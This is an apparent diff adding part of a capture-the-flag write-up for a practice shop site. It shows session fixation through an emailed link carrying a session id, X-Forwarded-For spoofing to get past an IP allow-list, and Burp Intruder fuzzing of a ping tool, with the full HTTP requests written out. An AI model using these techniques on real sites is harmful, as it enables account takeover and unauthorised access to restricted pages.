@@ -353,4 +353,99 @@ OK so moving on, flag 5 would be the logical one to get next. Flag no.4 gave us 
 Something I have noticed is that the session id is reflected for every page in a query parameter for example
 
 ```
-http://vulncommerce.co.uk/login?session_id=ODk1NDIxYmUyYzFjNjQyZWM0YjJlYmI1Mzc1MzQ1MzRjMmM5Y2Q4NGJjYmFmZWY4M2VjYjRmOWNmZjdkZTU4ODY0ZGRlZDM5MGMwNTE2ZTkzMjQxMmExZWRkNzc5ZDEzZGNiNDBkZDQ0OWYyNTRiYmUyM2I1ZDgwMWM2M2M0Mzc=```
+http://vulncommerce.co.uk/login?session_id=ODk1NDIxYmUyYzFjNjQyZWM0YjJlYmI1Mzc1MzQ1MzRjMmM5Y2Q4NGJjYmFmZWY4M2VjYjRmOWNmZjdkZTU4ODY0ZGRlZDM5MGMwNTE2ZTkzMjQxMmExZWRkNzc5ZDEzZGNiNDBkZDQ0OWYyNTRiYmUyM2I1ZDgwMWM2M2M0Mzc=
+```
+
+It's a bit of a weird place to store a session id, lets email simon this link to see if he automatically follows it and then I may end up being him....
+
+After waiting a minute or two and refreshing the page, I notice that simon is signed in, click his name and there is flag no. 5
+
+![alt](./images/vulncommerce-11.png)
+
+Have a new link too which gives the message
+
+```
+Connection from <my-ip> not allowed
+```
+
+I tried with 8.8.17.22 and 192.9.1.122 (setting the X-Forwarded-For) but these also give the same problem. I wonder if using the network test tool I can enumerate IP's that work on either of those ranges?
+
+Here's an example of that request and response
+
+```
+GET /adm1n-man4gem3nt-12bfb3 HTTP/1.1
+Host: www.vulncommerce.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+X-Forwarded-For: 8.8.17.22
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+```
+
+```
+HTTP/1.1 200 OK
+server: nginx/1.21.1
+date: Thu, 30 Jun 2022 07:25:09 GMT
+content-type: text/html; charset=UTF-8
+set-cookie: ctfchallenge=xxx; Max-Age=2592000; Path=/; domain=.vulncommerce.co.uk
+connection: close
+Content-Length: 51
+
+Connection from 8.8.17.22,<my-ip> not allowed
+```
+
+OK let's consider where I am at the moment, so the profile page for simon gave me a hint with he message
+
+```
+There's no username and password for it because the only place you can view it from is HQ (so don't tell anyone else in the office)
+```
+
+Also from the discovery earlier in the updates.txt
+
+```
+Clients requests first go to the load balancer and will then be forwarded to an available server. We currently only have one server but will add some more soon.
+```
+
+So I can only access that page from HQ, which we know about an IP (8.8.17.22) associated with it from the host command
+
+```
+└─$ host hq.vulncommerce.co.uk                             
+hq.vulncommerce.co.uk has address 8.8.17.22
+```
+
+I also have the ping tool which it seems I can ping any public IP, but I can't ping 8.8.17.22 which I have to assume is a internal private range...
+
+And how about the load balancer, I guess that must be the IP behind the main domain vulncommerce.co.uk
+
+```
+└─$ host vulncommerce.co.uk   
+vulncommerce.co.uk has address 68.183.255.206
+vulncommerce.co.uk mail is handled by 10 mx00.ionos.co.uk.
+vulncommerce.co.uk mail is handled by 10 mx01.ionos.co.uk.
+```
+
+So can I use the assumed IP of the load balancer to discover the IP of the server it forwards it requests to? Lets try a fuzz with Burp Intruder such as the below using the `X-Forwarded-For` header and a fuzz range of 0-255
+
+```
+POST /stats HTTP/1.1
+Host: www.vulncommerce.co.uk
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: 68.183.255.206
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+Origin: http://www.vulncommerce.co.uk
+Connection: close
+Referer: http://www.vulncommerce.co.uk/stats
+Cookie: ctfchallenge=xxx
+Upgrade-Insecure-Requests: 1
+
+ping_target=8.8.17.<FUZZ>
+```
+
+And no still all FAIL results. I feel I'm on the right track I'm just missing a small part of the puzzle...
